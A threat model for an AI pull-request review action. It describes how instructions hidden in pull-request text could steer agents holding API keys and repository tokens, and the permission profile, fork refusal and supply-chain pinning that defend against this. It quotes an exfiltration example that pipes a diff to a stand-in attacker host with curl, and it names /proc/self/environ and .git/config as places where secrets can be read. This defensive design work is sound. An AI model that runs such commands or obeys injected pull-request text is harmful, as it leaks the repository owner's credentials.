# Threat model

The uncomfortable sentence first.

**Without the fork switch described below, this package reviews contributions from people who could
already push to your repository.** It is not a sandbox for untrusted code. What it defends against
is the **content** a run reads: a diff, a pull request title, a body, a comment. It is not a change
to the package, the workflow or the prompt by somebody with write access. Against an author who can
push, nothing here is a boundary, and nothing here pretends to be: they could add a step that echoes
your key.

That is a narrower promise than "AI code review, secured". It is also the promise that can actually
be kept, and the rest of this document is what it buys you.

## The risk

An agent reads text somebody else wrote while the model provider key and a repository token sit in
its process environment. Somewhere in that text may be a sentence addressed to the agent rather than
to a reviewer. Asking the model nicely to ignore such sentences does not remove the risk; the prompts
do ask, and that is a second line, not the first.

The first line is that the agents have nowhere to take anything.

## What the review agents may do

Both diff-reading agents run under the `read-only-no-shell` profile
([`profiles/read-only-no-shell.json`](../profiles/read-only-no-shell.json)):

| | |
| --- | --- |
| `bash` | denied entirely |
| `webfetch`, `websearch` | denied |
| `task` | denied, so there is no sub-agent with different permissions |
| `read` | allowed, except `/proc/**`, `/sys/**`, `.git/**` |
| `edit` | denied, except inside `.pitcrew-run/` |
| `external_directory` | denied |

Each of those has a reason:

**No shell at all, and no allowlist.** An allowlist of read-only commands was tried and rejected,
because it would not have worked. OpenCode matches bash permission patterns against the *entire*
command string (`resources: [input.command]` in `packages/core/src/tool/bash.ts`, where a
parser-based check is still an open TODO), so a rule like `"git diff*"` also matches
`git diff | curl -d @- https://attacker/`. A prefix allowlist is a speed bump, not a boundary.

**`/proc` and `/sys` are where the environment is a file.** `/proc/self/environ` holds the model key.
An agent that may read any path may read that one, and a "read the diff" instruction hidden in a
pull request body would be enough. The agent is handed the diff as a file and never needs either
directory.

**`.git/` because of the token.** Some `actions/checkout` versions leave the repository token inside
`.git/config`.

**Writing is confined to `.pitcrew-run/`, which is git-ignored.** Ignored matters twice: the OpenCode
runtime commits and pushes whatever `git status --porcelain` reports, so a stray file would turn a
review into a commit; and the job runs with `contents: read`, which is the same door closed from the
other side. The action writes the ignore rule into `.git/info/exclude` itself, so it cannot be
forgotten by a consumer who never read this file.

**The profile ships with the package.** This is the part that changed when the bundle became a
package, and it is the strongest property here. The permissions are not a file in your repository
that a pull request could edit; they are read out of the checkout GitHub makes of *this* action, at
the ref you pinned. A pull request that rewrites every file it can reach still cannot give its own
reviewer a shell.

## What the acceptance agent may do

It keeps its shell, and that is not an oversight. It drives a browser through Node; denying `curl`
while allowing `node` would be a boundary in name only. It also holds the credentials of the
environment under test.

So the acceptance agent gets a different rule: run it only where the pull request author is trusted.
Concretely:

- **In a public repository it refuses to start.** The runtime puts the pull request's title, body and
  comments into the prompt, and in a public repository anybody with a GitHub account can write those.
  `PITCREW_ALLOW_PUBLIC_ACCEPTANCE=true` turns the refusal off. Set it only if the previous sentence
  describes a risk you accept.
- The two review agents are unaffected by that and keep running in public repositories, because the
  analysis above holds for them: hostile text has nowhere to go.

## Forks

**Fork pull requests are refused, not sandboxed.**

The `pull_request` trigger withholds repository secrets from a fork's pull request all by itself, so
an agent there fails for lack of a key. That is the intended outcome, but it is only half the
triggers. An `issue_comment` event **always** runs in the base repository, on its default branch,
with secrets, whatever pull request it names. A maintainer typing `/review` on a fork's pull request
would therefore hand a stranger's diff to an agent holding the model key.

[`scripts/assert-same-repo.mjs`](../scripts/assert-same-repo.mjs) therefore runs first in every
agent run and stops the job when the head branch lives elsewhere. It cannot be a workflow `if:`: the
`issue_comment` payload carries no `head.repo`.

**What this costs.** In an open-source project, where most pull requests come from forks, that is
most of the value. The honest state of things:

| Repository | Trigger | Head branch | Today |
| --- | --- | --- | --- |
| private | `pull_request` | same repo | runs |
| private | `issue_comment` (`/review`) | same repo | runs |
| any | `pull_request` | fork | refused; GitHub withholds the secrets anyway |
| any | `issue_comment` | fork | refused by `assert-same-repo.mjs` |
| public | acceptance test, any trigger | any | refused unless `PITCREW_ALLOW_PUBLIC_ACCEPTANCE=true` |

A reviewed, opt-in path for fork pull requests, with shell-less agents only and behind a GitHub
environment with a required approver, is the obvious next step and is
[tracked as an issue](https://github.com/RobYed/pr-pitcrew/issues). It is not in this release
because a convenient version of it would be worse than none: `pull_request_target` is the obvious
answer and the dangerous one, and shipping it without the base-branch checkout for everything
executable is the classic mistake with that event.

Until then: if your repository takes fork contributions, this package reviews the pull requests your
own team opens, and nothing else. Plan for that rather than around it.

A fork review is also a data-protection question and not only a security one: a stranger's diff would
go to the repository operator's model provider. That belongs in the same paragraph as the risk, not
in a footnote.

## Who may trigger a run

- The automatic trigger is `pull_request` on the repository's own branches, and it skips drafts.
- A comment trigger requires the comment's author association to be `OWNER`, `MEMBER` or
  `COLLABORATOR`, and the author not to be a bot.
- Independently of that, the OpenCode runtime refuses to run for an actor without write access to
  the repository.

## The comment trigger reads the base branch's configuration

On `pull_request`, the workflow, the pinned ref and the prompt are the pull request's own files
anyway, and against an author who can push none of that is a boundary.

On `issue_comment` the two come apart, and there the difference is real: such a run starts on the
default branch. The agent's manifest, profile and prompt come from the package at the ref the
*default branch's* workflow pins - not from the head branch the runtime later checks out. A
maintainer typing `/review` on somebody's branch reviews it with the base branch's settings.

The endpoint is not in any file that a branch can reach. It arrives as a repository variable, so no
branch can point the provider at a host that collects the key.

## The supply chain

This is listed here rather than under "limitations", because it is the largest piece of trust the
package asks you to extend.

**The OpenCode runtime is downloaded at run time.** The pinned wrapper action runs
`curl -fsSL https://opencode.ai/install | bash`, in a process that holds your model key and the
repository token. The action sets `VERSION`, which the installer honours, so the download is a known
version rather than whatever is newest. But that is a pinned version, **not a checksum**. The
download still comes from that host over TLS, and a compromise of it would execute on your runner
with those secrets present.

What pinning does remove is the automatic part: a new OpenCode release cannot arrive in your
pipeline on its own.

**Pinning policy.** The wrapper action's commit SHA and the `opencode-version` input in
[`actions/agent/action.yml`](../actions/agent/action.yml) belong together and are raised in the same
change. Every third-party action in this repository is pinned to a commit, never to a tag; a test
fails the build if one is not ([`scripts/package.test.mjs`](../scripts/package.test.mjs)).
Dependabot watches them.

**What you should pin.** This package, on a commit SHA, if the moving `v1` tag is more trust than
you want to extend to a repository you do not control. See the README.

**The Playwright image.** The acceptance test runs in `mcr.microsoft.com/playwright`, pinned to a
version tag rather than a digest. It is a container, not a script that runs beside your secrets in
the same process, but it is the environment those secrets live in for that job.

## Where your data goes

Out of the runner, to the model provider **you** configured, and nowhere else:

- the pull request's diff - the whole thing on the first run and on `/review`, the new commits on a
  push;
- the pull request's title, body and comments, which the runtime puts into the prompt;
- the linked issue, for the acceptance test;
- whatever files the agent chooses to read from the checkout, including `AGENTS.md` or `CLAUDE.md`;
- for the acceptance test, what it sees in the browser at your `PITCREW_TARGET_URL`.

Not out of the runner:

- the session transcript. `share: false` is set on every run, always, so nothing is uploaded to
  opencode.ai. The transcript is written into the run summary of your own workflow instead.
- the model key, the repository token and the credentials of the environment under test, other than
  into the processes that need them. They are kept out of the prompt on purpose: the prompt is
  echoed into the run log, so placeholder substitution uses an allowlist rather than the whole
  environment ([`scripts/build-config.mjs`](../scripts/build-config.mjs)).

Two things follow that this project cannot do for you. **The contract with your model provider is
yours**: if your repository contains personal data, the diff going to that provider is a processing
relationship you need an agreement for. And **the choice of provider stays yours** - a European
endpoint, a self-hosted one, or none of the above. This package names no vendor, so it takes no
position. That is a map, not legal advice.

One caveat on the run summary: GitHub masks registered secrets in **log output**, not in the Markdown
page a step writes. The transcript therefore redacts any value it can see under a name that sounds
like a secret (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`), and `TRANSCRIPT_REDACT` adds
names that do not sound like one - which is how a test account's e-mail address is covered.

## Recommended hardening for consumers

- **Put the jobs that hold secrets into a GitHub environment with a required reviewer.** Then a
  person decides before a diff reaches a model. This is the single most useful thing you can add,
  and it is entirely on your side of the line.
- **Pin this package to a commit SHA** and let Dependabot propose the bumps.
- **Keep `contents: read`.** The examples do; there is no reason to widen it.
- **Do not put the acceptance reviewer account in `CODEOWNERS`.** GitHub would request it on every
  pull request, and the walk-through would start by itself, which is the one thing that trigger
  exists to prevent.

## Reporting

See [`SECURITY.md`](../SECURITY.md).
